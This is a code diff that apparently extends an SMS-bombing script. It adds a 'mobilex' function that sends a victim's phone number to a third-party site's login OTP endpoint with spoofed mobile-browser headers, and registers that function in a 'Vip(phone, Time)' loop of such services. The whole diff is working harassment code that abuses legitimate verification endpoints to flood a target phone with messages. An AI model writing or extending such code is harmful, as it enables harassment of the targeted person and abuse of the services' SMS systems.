@@ -52,6 +52,38 @@ def check_internet():
 # ------------------------------
 # SMS Service
 # ------------------------------
+def mobilex(phone):
+    import requests
+    
+    formatted_phone = "0" + phone.replace("+98", "")
+    url = "https://backend.mobilex.ir/api/v1/user/login/otp"
+    
+    payload = {
+        "mobile": formatted_phone
+    }
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
+        "Accept": "application/json, text/plain, */*",
+        "Content-Type": "application/json",
+        "Origin": "https://mobilex.ir",
+        "Referer": "https://mobilex.ir/",
+    }
+    
+    try:
+        response = requests.post(url, json=payload, headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            print(f'{g}(mobilex) {a}Code Sent')
+            return True
+        else:
+            print(f'{r}[-] (mobilex) HTTP Error: {response.status_code}{a}')
+            return False
+            
+    except Exception as e:
+        print(f'{r}[!] mobilex Exception: {e}{a}')
+        return False
+
 
 def alldigitall(phone):
     import requests
@@ -104,7 +136,8 @@ def send_service_safe(service, phone):
         
 def Vip(phone, Time):
     services = [
-    alldigitall,  # سرویس جدید
+    alldigitall,
+    mobilex,  # سرویس جدید
 ]
     total_services = len(services)
 
